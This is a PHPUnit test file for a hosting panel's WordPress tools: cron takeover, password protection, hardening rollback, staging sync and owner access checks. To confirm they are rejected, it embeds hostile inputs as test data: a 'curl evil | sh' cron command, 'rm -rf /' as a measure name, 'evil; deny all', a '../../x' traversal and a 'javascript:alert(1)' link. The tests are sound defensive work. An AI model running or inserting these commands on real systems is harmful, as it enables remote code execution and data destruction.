<?php

declare(strict_types=1);

namespace NimVor\Tests\Http;

use NimVor\Database\Connection;
use NimVor\Http\Session\ArraySession;
use NimVor\Services\WordPressVulnerabilities;
use NimVor\Tests\Support\HttpTestCase;

/**
 * WordPress toolkit tools: switches, passwords, logs, security hardening
 * with rollback, vulnerabilities, staging (clone, sync, restore), and who
 * may use them.
 */
final class WordPressToolsTest extends HttpTestCase
{
    private int $siteId;
    private int $stagingId;
    private int $otherId;
    private int $wp;
    private int $otherWp;
    private Connection $db;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seedUser('admin', 'admin');
        $cust = $this->seedUser('cust', 'customer');
        $other = $this->seedUser('other', 'customer');
        $this->seedUser('viewer', 'viewer');
        $this->db = $this->app->container->get(Connection::class);
        $add = function (string $domain, string $user, int $owner): int {
            $this->db->run("INSERT INTO websites (server_id, domain, kind, php_version, https, root, document_root, system_user, owner_id, status, created_at, updated_at) VALUES (1, ?, 'php', '8.3', 1, ?, ?, ?, ?, 'active', 'x', 'x')",
                [$domain, '/home/nimvor/' . $domain, '/home/nimvor/' . $domain . '/public_html', $user, $owner]);
            return (int) $this->db->lastInsertId();
        };
        $this->siteId = $add('shop.test', 'shop', $cust);
        $this->stagingId = $add('staging.shop.test', 'shopstg', $cust);
        $this->otherId = $add('other.test', 'other', $other);
        $install = function (int $site, string $path, string $db): int {
            $this->db->run("INSERT INTO wordpress_installs (server_id, website_id, path, version, db_name, latest, scanned_at) VALUES (1, ?, ?, '6.8', ?, '6.9', 'x')", [$site, $path, $db]);
            return (int) $this->db->lastInsertId();
        };
        $this->wp = $install($this->siteId, 'public_html/blog', 'cust_shop');
        $this->otherWp = $install($this->otherId, 'public_html', 'other_wp');
        foreach ([['cust_shop', $cust], ['other_wp', $other]] as [$name, $owner]) {
            $this->db->run("INSERT INTO databases (server_id, owner_id, name, created_at) VALUES (1, ?, ?, 'x')", [$owner, $name]);
        }
        $this->agent->succeed('wordpress.info', [
            'version' => '6.8', 'php' => '8.3.6', 'mysql' => '10.11', 'siteurl' => 'https://shop.test/blog', 'home' => 'https://shop.test/blog', 'title' => 'Shop',
            'search_engines' => true, 'core' => ['latest' => '6.9', 'php_needed' => '', 'checked_at' => 1790000000],
            'plugins' => [['name' => 'contact-form-7', 'title' => 'Contact Form 7', 'version' => '5.3.1', 'active' => true, 'update' => '', 'auto_update' => false]],
            'themes' => [], 'admins' => [['id' => 1, 'login' => 'owner']], 'admin_login_exists' => false,
            'constants' => ['WP_DEBUG' => false, 'DISALLOW_FILE_EDIT' => true], 'maintenance' => false,
            'db' => ['name' => 'cust_shop', 'host' => 'localhost', 'prefix' => 'wp_', 'tables' => 12, 'bytes' => 1024], 'config_mode' => '0600',
        ]);
        $this->agent->succeed('protect.status', ['password' => [], 'hotlink' => null, 'wordpress' => []]);
        $this->agent->succeed('wordpress.security', ['problems' => [], 'measures' => [
            ['id' => 'block_xmlrpc', 'title' => 'Block access to xmlrpc.php', 'help' => 'h', 'kind' => 'web', 'applied' => false, 'can_rollback' => false],
            ['id' => 'disable_file_edit', 'title' => 'Turn off the file editor in the dashboard', 'help' => 'h', 'kind' => 'wordpress', 'applied' => true, 'can_rollback' => true],
        ]]);
        $this->agent->succeed('wordpress.restore_points', ['restore_points' => [['id' => '20260901T120000Z', 'path' => 'public_html/blog', 'database' => 'cust_shop', 'files' => true, 'reason' => 'sync from staging.shop.test']]]);
        $this->agent->succeed('wordpress.manage', ['op' => 'x']);
        $this->agent->succeed('cron.apply', ['ok' => true]);
        $this->login('cust');
    }

    private function tool(array $body, ?int $wp = null, ?int $site = null): \NimVor\Http\Response
    {
        return $this->post('/sites/' . ($site ?? $this->siteId) . '/wordpress/' . ($wp ?? $this->wp) . '/tools', $body);
    }

    public function testPageShowsTheToolkit(): void
    {
        $page = $this->request('GET', '/sites/' . $this->siteId . '/wordpress/' . $this->wp)->body();
        foreach (['File Manager', '?path=public_html%2Fblog', 'Search engine indexing', 'Debugging', 'Password protection', 'Take over wp-cron.php', 'Hotlink protection',
            'Vulnerability protection', 'Change administrator password', 'Security hardening', '1 of 2 applied', 'Secure (recommended)', 'Change database password',
            'Open in database browser', 'Clone WordPress', 'Sync to another installation', '2026-09-01 12:00 UTC', 'staging.shop.test'] as $want) {
            self::assertStringContainsString($want, $page, $want);
        }
        self::assertStringNotContainsString('other.test', $page, 'another owner\'s websites are never offered as targets');
        self::assertSame('public_html/blog/', $this->lastCall('wordpress.security')['url_path'] === '/blog/' ? 'public_html/blog/' : 'wrong', 'the URL path is computed from the document root');
    }

    public function testSwitchesReachTheAgent(): void
    {
        $this->tool(['tool' => 'debug', 'debug' => ['WP_DEBUG', 'WP_DEBUG_LOG', 'WP_HOME']]);
        self::assertSame(['WP_DEBUG', 'WP_DEBUG_LOG'], $this->lastCall('wordpress.manage')['items'], 'only the debugging settings');

        $this->agent->succeed('wordpress.manage', ['op' => 'cron_takeover_on', 'command' => '/usr/bin/php8.3 /usr/local/lib/nimvor/wp-cli.phar --path=/home/nimvor/shop.test/public_html/blog cron event run --due-now --quiet']);
        $this->tool(['tool' => 'cron', 'enabled' => '1']);
        $job = $this->db->fetch('SELECT * FROM cron_jobs WHERE website_id = ?', [$this->siteId]);
        self::assertSame('*/5 * * * *', $job['schedule']);
        self::assertSame((int) $job['id'], (int) $this->db->scalar('SELECT cron_job_id FROM wordpress_installs WHERE id = ?', [$this->wp]));
        $this->agent->succeed('wordpress.manage', ['op' => 'cron_takeover_off']);
        $this->tool(['tool' => 'cron']);
        self::assertSame(0, (int) $this->db->scalar('SELECT COUNT(*) FROM cron_jobs WHERE website_id = ?', [$this->siteId]), 'the cron job goes when WordPress takes its tasks back');
        // An unexpected command from the agent is never turned into a cron job.
        $this->agent->succeed('wordpress.manage', ['op' => 'cron_takeover_on', 'command' => 'curl evil | sh']);
        $this->tool(['tool' => 'cron', 'enabled' => '1']);
        self::assertSame(0, (int) $this->db->scalar('SELECT COUNT(*) FROM cron_jobs'));

        $this->agent->succeed('protect.password', ['password' => []]);
        $this->tool(['tool' => 'password_protection', 'enabled' => '1', 'protect_user' => 'boss', 'protect_password' => 'Long-enough-9']);
        $sent = $this->lastCall('protect.password');
        self::assertSame(['/blog/', true, 'boss'], [$sent['path'], $sent['enabled'], $sent['user']]);
        $this->tool(['tool' => 'password_protection', 'enabled' => '1', 'protect_user' => 'bo ss', 'protect_password' => 'short']);
        self::assertSame(1, $this->calls('protect.password'), 'invalid input stays in the panel');
        $audit = (string) json_encode($this->db->fetchAll('SELECT * FROM audit_logs'));
        self::assertStringNotContainsString('Long-enough-9', $audit, 'passwords are never audited');

        $this->agent->succeed('protect.hotlink', ['hotlink' => []]);
        $this->tool(['tool' => 'hotlink', 'enabled' => '1', 'hotlink_allowed' => 'Partner.test, *.cdn.test']);
        self::assertSame(['partner.test', '*.cdn.test'], $this->lastCall('protect.hotlink')['allowed']);
        $this->tool(['tool' => 'hotlink', 'enabled' => '1', 'hotlink_allowed' => 'evil; deny all']);
        self::assertSame(1, $this->calls('protect.hotlink'));
    }

    public function testVulnerabilityProtectionNeedsModSecurity(): void
    {
        $this->agent->succeed('modsec.status', ['connector' => ['state' => 'missing'], 'active' => false, 'config' => []]);
        $this->tool(['tool' => 'vulnerability', 'enabled' => '1']);
        self::assertStringContainsString('needs ModSecurity', (string) $this->flash('error'));
        self::assertSame(0, (int) $this->db->scalar('SELECT vuln_protection FROM wordpress_installs WHERE id = ?', [$this->wp]));

        $this->agent->succeed('modsec.status', ['connector' => ['state' => 'functional'], 'active' => true, 'config' => ['detection_only' => false], 'sites' => []]);
        $this->agent->succeed('modsec.site', ['ok' => true]);
        $this->tool(['tool' => 'vulnerability', 'enabled' => '1']);
        self::assertSame('on', $this->lastCall('modsec.site')['mode']);
        self::assertSame(1, (int) $this->db->scalar('SELECT vuln_protection FROM wordpress_installs WHERE id = ?', [$this->wp]));
        $this->tool(['tool' => 'vulnerability']);
        self::assertSame('detect', $this->lastCall('modsec.site')['mode']);
    }

    public function testPasswordsAndLogs(): void
    {
        $this->agent->succeed('wordpress.manage', ['op' => 'admin_password', 'login' => 'owner']);
        $this->tool(['tool' => 'admin_password', 'admin_id' => '1', 'admin_password' => 'New-admin-pass-1', 'admin_password_confirm' => 'New-admin-pass-2']);
        self::assertSame(0, $this->calls('wordpress.manage'), 'passwords that do not match');
        $this->tool(['tool' => 'admin_password', 'admin_id' => '1', 'admin_password' => 'New-admin-pass-1', 'admin_password_confirm' => 'New-admin-pass-1']);
        self::assertSame(['1'], $this->lastCall('wordpress.manage')['items']);
        self::assertSame('New-admin-pass-1', $this->lastCall('wordpress.manage')['password']);

        $this->db->run("INSERT INTO database_users (server_id, owner_id, username, host, password_enc, created_at) VALUES (1, NULL, 'cust_shop', 'localhost', 'old-enc', 'x')");
        $this->agent->succeed('wordpress.manage', ['op' => 'db_password', 'user' => 'cust_shop']);
        $this->tool(['tool' => 'db_password']);
        $sent = (string) $this->lastCall('wordpress.manage')['password'];
        self::assertGreaterThanOrEqual(20, strlen($sent));
        self::assertSame($sent, $this->flash('wp_db_password'), 'shown once to the user');
        self::assertNotSame('old-enc', $this->db->scalar("SELECT password_enc FROM database_users WHERE username = 'cust_shop'"), 'the stored copy follows');
        self::assertStringNotContainsString($sent, (string) json_encode($this->db->fetchAll('SELECT * FROM audit_logs')));

        $this->agent->succeed('wordpress.manage', ['op' => 'debug_log', 'path' => 'public_html/blog/wp-content/debug.log', 'exists' => true, 'lines' => ['PHP Notice: <b>x</b>'], 'size' => 30]);
        $page = $this->request('GET', '/sites/' . $this->siteId . '/wordpress/' . $this->wp . '/logs')->body();
        self::assertStringContainsString('PHP Notice: &lt;b&gt;x&lt;/b&gt;', $page);
    }

    public function testSecurityHardeningAndRollback(): void
    {
        $this->tool(['tool' => 'security', 'op' => 'apply', 'recommended' => '1']);
        $sent = $this->lastCall('wordpress.security');
        self::assertSame(['apply', '/blog/'], [$sent['op'], $sent['url_path']]);
        self::assertContains('no_php_in_uploads', $sent['measures']);
        $this->tool(['tool' => 'security', 'op' => 'rollback', 'measures' => ['disable_file_edit', 'rm -rf /']]);
        $sent = $this->lastCall('wordpress.security');
        self::assertSame(['rollback', ['disable_file_edit']], [$sent['op'], $sent['measures']], 'only measure names');
    }

    public function testStagingStaysWithinTheOwner(): void
    {
        $this->agent->succeed('db.create', ['ok' => true]);
        $this->agent->succeed('db.user_create', ['ok' => true]);
        $this->agent->succeed('db.grant', ['ok' => true]);
        $this->agent->succeed('wordpress.copy', ['job_id' => 'cafe0123456789ab']);
        // Another owner's website as the target: refused.
        $this->tool(['tool' => 'clone', 'target_site' => (string) $this->otherId]);
        self::assertSame(0, $this->calls('wordpress.copy'));
        $this->tool(['tool' => 'clone', 'target_site' => (string) $this->stagingId, 'target_path' => '', 'staging' => '1']);
        $sent = $this->lastCall('wordpress.copy');
        self::assertSame(['clone', 'cust_shop', 'https://staging.shop.test', 'staging.shop.test', 'public_html'], [$sent['mode'], $sent['source_db'], $sent['url'], $sent['target']['domain'], $sent['target']['path']]);
        self::assertSame((int) $this->db->scalar('SELECT owner_id FROM websites WHERE id = ?', [$this->siteId]), (int) $this->db->scalar('SELECT owner_id FROM databases WHERE name = ?', [$sent['db']['name']]), 'the copy\'s database belongs to the owner');
        $copy = (int) $this->db->scalar('SELECT id FROM wordpress_installs WHERE website_id = ? AND cloned_from = ?', [$this->stagingId, $this->wp]);
        self::assertGreaterThan(0, $copy);
        self::assertSame('cafe0123456789ab', $this->flash('job'));

        // Sync back: databases come from the panel's own records.
        $this->tool(['tool' => 'sync', 'target' => (string) $this->wp, 'files' => '1', 'database' => '1'], $copy, $this->stagingId);
        $sent = $this->lastCall('wordpress.copy');
        self::assertSame(['sync', $sent['source_db'], 'cust_shop', 'https://shop.test/blog'], [$sent['mode'], $sent['source_db'], $sent['target_db'], $sent['url']]);
        // A website whose wp-config.php names someone else's database.
        $this->db->run("UPDATE wordpress_installs SET db_name = 'other_wp' WHERE id = ?", [$copy]);
        $before = $this->calls('wordpress.copy');
        $this->tool(['tool' => 'sync', 'target' => (string) $this->wp, 'database' => '1'], $copy, $this->stagingId);
        self::assertSame($before, $this->calls('wordpress.copy'), 'another owner\'s database is never copied');
        // Another owner's installation as the target.
        $this->tool(['tool' => 'sync', 'target' => (string) $this->otherWp, 'files' => '1']);
        self::assertSame($before, $this->calls('wordpress.copy'));

        $this->tool(['tool' => 'restore', 'restore_point' => '20260901T120000Z']);
        self::assertSame(['restore', '20260901T120000Z', 'cust_shop'], [$this->lastCall('wordpress.copy')['mode'], $this->lastCall('wordpress.copy')['restore_point'], $this->lastCall('wordpress.copy')['target_db']]);
        $this->tool(['tool' => 'restore', 'restore_point' => '../../x']);
        self::assertSame('20260901T120000Z', $this->lastCall('wordpress.copy')['restore_point']);
    }

    public function testWhoMayUseTheTools(): void
    {
        $this->agent->succeed('wordpress.manage', ['op' => 'debug_log', 'path' => 'x', 'exists' => false, 'lines' => [], 'size' => 0]);
        foreach (['other' => [404, 404], 'viewer' => [403, 200]] as $who => [$change, $read]) {
            $this->session = new ArraySession();
            $this->app = $this->makeApp();
            $this->login($who);
            self::assertSame($change, $this->tool(['tool' => 'debug', 'debug' => ['WP_DEBUG']])->status(), $who . ' changes');
            self::assertSame($read, $this->request('GET', '/sites/' . $this->siteId . '/wordpress/' . $this->wp . '/logs')->status(), $who . ' reads the log');
        }
        self::assertSame('debug_log', $this->lastCall('wordpress.manage')['op'], 'the viewer only read');
        // Through my website's address, another owner's installation.
        $this->session = new ArraySession();
        $this->app = $this->makeApp();
        $this->login('cust');
        $n = $this->calls('wordpress.manage');
        $this->tool(['tool' => 'debug', 'debug' => ['WP_DEBUG']], $this->otherWp);
        self::assertSame($n, $this->calls('wordpress.manage'));
    }

    public function testVulnerabilityMatching(): void
    {
        $plugin = ['vulnerability' => [
            ['name' => 'Contact Form 7 < 5.3.2 - Unrestricted File Upload', 'operator' => ['min_version' => null, 'min_operator' => null, 'max_version' => '5.3.2', 'max_operator' => 'lt', 'unfixed' => '0'],
                'source' => [['id' => 'CVE-2020-35489', 'link' => 'https://nvd.nist.gov/vuln/detail/CVE-2020-35489']], 'impact' => ['cvss' => ['score' => '10.0', 'severity' => 'c']]],
            ['name' => 'Old issue <= 4.0', 'operator' => ['max_version' => '4.0', 'max_operator' => 'le', 'unfixed' => '0'], 'source' => [], 'impact' => []],
            ['name' => 'Unfixed', 'operator' => ['min_version' => '5.0', 'min_operator' => 'ge', 'unfixed' => '1'], 'source' => [['id' => 'x', 'link' => 'javascript:alert(1)']], 'impact' => ['cvss' => ['severity' => 'm']]],
        ]];
        $fetched = [];
        $v = new WordPressVulnerabilities('', static function (string $url) use ($plugin, &$fetched): ?string {
            $fetched[] = $url;
            return str_contains($url, '/plugin/contact-form-7/') ? (string) json_encode(['error' => 0, 'data' => $plugin]) : (str_contains($url, '/core/') ? null : '{"error":0,"data":[]}');
        });
        $res = $v->check(['version' => '6.8', 'plugins' => [['name' => 'contact-form-7', 'title' => 'Contact Form 7', 'version' => '5.3.1']], 'themes' => []]);
        self::assertFalse($res['reachable'], 'an unreachable database is said, not reported as clean');
        self::assertSame(['Contact Form 7 < 5.3.2 - Unrestricted File Upload', 'Unfixed'], array_column($res['items'], 'name'));
        self::assertSame(['critical', '5.3.2', 'CVE-2020-35489'], [$res['items'][0]['severity'], $res['items'][0]['fixed_in'], $res['items'][0]['cve']]);
        self::assertSame('', $res['items'][1]['link'], 'only https links');
        self::assertContains('https://www.wpvulnerability.net/core/6.8/', $fetched);
        self::assertTrue(WordPressVulnerabilities::matches('5.3.1', ['max_version' => '5.3.2', 'max_operator' => 'lt']));
        self::assertFalse(WordPressVulnerabilities::matches('5.3.2', ['max_version' => '5.3.2', 'max_operator' => 'lt']));
    }

    public function testNewInstallationsAreHardenedOnce(): void
    {
        $dbId = (int) $this->db->scalar("SELECT id FROM databases WHERE name = 'cust_shop'");
        foreach (['j-ok-0000000001' => 'succeeded', 'j-bad-000000002' => 'failed'] as $job => $status) {
            $this->db->run("INSERT INTO agent_jobs (server_id, job_id, kind, target_type, target_id, status, created_at) VALUES (1, ?, 'app', 'website', ?, ?, 'x')", [$job, (string) $this->siteId, $status]);
            $this->db->run("INSERT INTO app_installs (website_id, app, path, database_id, job_id, created_at) VALUES (?, 'wordpress', ?, ?, ?, 'x')", [$this->siteId, $status === 'succeeded' ? 'public_html' : 'public_html/x', $dbId, $job]);
        }
        $tools = $this->app->container->get(\NimVor\Services\WordPressToolsService::class);
        $lines = $tools->autoHarden(true);
        self::assertCount(1, $lines, implode("\n", $lines));
        $sent = $this->lastCall('wordpress.security');
        self::assertSame(['apply', 'public_html', '/'], [$sent['op'], $sent['path'], $sent['url_path']]);
        self::assertSame(\NimVor\Services\WordPressToolsService::RECOMMENDED, $sent['measures']);
        $n = $this->calls('wordpress.security');
        self::assertSame([], $tools->autoHarden(true), 'once');
        self::assertSame($n, $this->calls('wordpress.security'));
        self::assertSame(0, (int) $this->db->scalar('SELECT COUNT(*) FROM app_installs WHERE hardened = 0'));
    }

    public function testDailyVulnerabilityCheckQueryRuns(): void
    {
        // The query once asked the websites table for a column it does not have
        // ("account_suspended" is computed from the owner), which made every
        // scheduler run abort before it recorded that it had run.
        $this->db->run('UPDATE wordpress_installs SET vuln_protection = 1 WHERE id = ?', [$this->wp]);
        $tools = $this->app->container->get(\NimVor\Services\WordPressToolsService::class);
        $lines = $tools->dailyVulnerabilityCheck();
        self::assertNotSame([], $lines, 'the protected installation was looked at');
        self::assertStringContainsString('shop.test', implode("\n", $lines));
    }
}
